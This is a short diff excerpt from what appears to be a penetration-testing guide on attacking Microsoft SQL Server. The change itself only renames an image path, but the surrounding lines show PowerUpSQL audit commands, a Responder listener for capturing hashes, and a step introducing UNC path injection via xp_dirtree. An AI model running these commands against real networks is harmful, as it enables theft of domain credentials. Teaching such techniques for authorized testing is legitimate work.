@@ -81,7 +81,7 @@ Get-SQLInstanceDomain | Invoke-SQLAuditPrivXpFileexist
 sudo responder -I tun0
 ```
 
-![](<../../../.gitbook/assets/image (52).png>)
+![](<../../../.gitbook/assets/image (52) (1).png>)
 
 4\. We can execute queries on the SQL server with PowerUpSQL and perform a UNC path injection with xp\_dirtree using the following command and query:
 
